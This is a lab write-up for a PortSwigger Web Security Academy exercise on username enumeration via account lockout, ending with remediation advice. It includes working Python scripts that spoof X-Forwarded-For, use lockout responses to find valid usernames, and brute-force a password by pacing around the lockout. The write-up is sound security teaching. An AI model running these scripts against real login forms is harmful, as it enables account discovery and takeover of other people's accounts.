# Username Enumeration via Account Lockout, with Bypass of Anti-Bruteforce Controls

**Bug class:** Authentication side-channel, insufficient anti-bruteforce defense
**Impact:** Account discovery and full account takeover despite a lockout mechanism intended to prevent it
**Platform:** PortSwigger Web Security Academy

## Target

A login form protected by an account lockout mechanism. After several failed authentication attempts against a single username, the account is temporarily locked. The mechanism is intended to prevent brute-force attacks.

## Vulnerability

The lockout mechanism creates an observable side-channel. The application responds differently to repeated failed logins depending on whether the username exists, because only existing accounts can be locked. This allows an unauthenticated attacker to enumerate valid usernames by triggering and observing lockout behavior.

The lockout itself is keyed on the username rather than on the client. It does not throttle attackers, only accounts, which means once a valid username is identified the lockout is also bypassable for password brute-forcing by pacing requests to stay below the threshold.

## Exploitation

### Step 1: Reject IP-based throttling as an enumeration path

The initial hypothesis was that the application throttled clients by IP and that rotating `X-Forwarded-For` would let a timing-based enumeration attack proceed without lockout. A test script rotated source IPs across a wordlist of candidate usernames and measured response timing:

```python
random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
response = requests.post(url,
    data={"username": name, "password": "x" * 40},
    headers={"X-Forwarded-For": random_ip})
```

Response times did not vary meaningfully with the username, and the application appeared to ignore `X-Forwarded-For` for rate-limiting decisions. This ruled out IP-based throttling as the relevant control and pointed at username-keyed lockout instead.

### Step 2: Use account lockout as an enumeration oracle

If lockout is keyed on the username, then submitting six failed logins against a username should produce one of two observable outcomes. For a non-existent username, every response will indicate invalid credentials. For an existing username, the response after the lockout threshold will change to indicate the account is locked.

The differential response is the oracle.

```python
import requests

URL = "https://TARGET.web-security-academy.net/login"
BAD_PASSWORD = "x" * 40

with open("users.txt") as f:
    for username in (line.strip() for line in f):
        for _ in range(6):
            response = requests.post(URL, data={
                "username": username,
                "password": BAD_PASSWORD,
            })
        if "Invalid username or password." not in response.text:
            print(f"[+] Valid username: {username}")
```

After six attempts per candidate, only valid usernames produce a response that does not contain the standard `Invalid username or password.` string. Running against a candidate wordlist:

```
[+] Valid username: atlas
```

### Step 3: Brute-force the password while pacing around the lockout

With `atlas` identified as a valid username, the same lockout mechanism now stands in the way of a password attack. Two options:

- Parallelize with Burp Intruder across many simultaneous sessions, accepting that some sessions hit lockout while others continue.
- Serialize a single session and pace requests to stay just under the lockout threshold, sleeping through the lockout window when one is hit.

The serial approach was selected for simplicity. The lockout window observed during enumeration was approximately 60 seconds, and the threshold was 3 failed attempts before the response changed to indicate lockout. The script attempts 3 passwords per cycle, detects a lockout response, sleeps 61 seconds, and retries the same password to confirm the cycle has reset.

```python
import time
import requests

URL = "https://TARGET.web-security-academy.net/login"
USERNAME = "atlas"

with open("passwords.txt") as f:
    for password in (line.strip() for line in f):
        while True:
            response = requests.post(URL, data={
                "username": USERNAME,
                "password": password,
            })
            if "too many" in response.text.lower():
                print(f"[*] Lockout triggered, sleeping 61s")
                time.sleep(61)
                continue
            if "Invalid username or password." not in response.text:
                print(f"[+] Password found: {password}")
                exit()
            print(f"[-] {password}")
            break
```

Result:

```
[-] letmein
[-] shadow
[-] master
[*] Lockout triggered, sleeping 61s
[-] 666666
...
[-] jessica
[+] Password found: pepper
```

### Step 4: Account takeover

Logged in as `atlas` with the recovered password through the standard login form.

## Reasoning notes

**On the choice of serial pacing over parallel intruder.** Burp Intruder with parallel sessions would have completed the password attack faster by working around the per-account lockout with multiple concurrent attempts. The trade-off is more network noise and a larger detection footprint, both of which matter on a real engagement and neither of which mattered here. For a lab, the serial approach has the advantage of producing a clean, single-session log that maps directly to what defenders would see. On a real engagement against a target with monitoring, the choice between serial-and-slow versus parallel-and-fast is the same trade-off real attackers make, and the answer depends on whether stealth or speed is the constraint.

**On the X-Forwarded-For dead end.** The IP rotation attempt was based on the assumption that the application's anti-bruteforce control would track clients by source IP and could be bypassed by spoofing the header. That assumption was wrong here. The application either does not honor `X-Forwarded-For` for rate-limiting decisions or does not rate-limit by IP at all. Either way, the dead end is informative: it ruled out a whole class of bypass and pointed at the account-keyed mechanism that turned out to be the relevant one.

## Root cause

Lockout-on-failed-attempts implemented per account, with response content that differs between locked-account and unknown-account states. The mechanism conflates two intended goals: making brute force expensive, and protecting individual accounts. By keying lockout on the username, the application protects accounts but does not throttle the attacker, and it leaks the existence of usernames as a side effect of the protection.

## Remediation

- **Do not respond differently to locked accounts versus invalid usernames.** Return the same generic message in both cases.
- **Throttle by client characteristics, not only by account.** Combine per-account lockout with per-IP or per-fingerprint rate limiting. Neither alone is sufficient.
- **Use CAPTCHA or proof-of-work after a small number of failures** before escalating to lockout. This raises the cost of automation without creating an enumeration oracle.
- **Alert on high-volume failed-login patterns** rather than relying purely on lockout to stop attacks. Detection is part of the control, not a substitute for it.

## References

- [PortSwigger: Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST SP 800-63B §5.2.2: Rate-Limiting (Throttling)](https://pages.nist.gov/800-63-3/sp800-63b.html#522-rate-limiting-throttling)
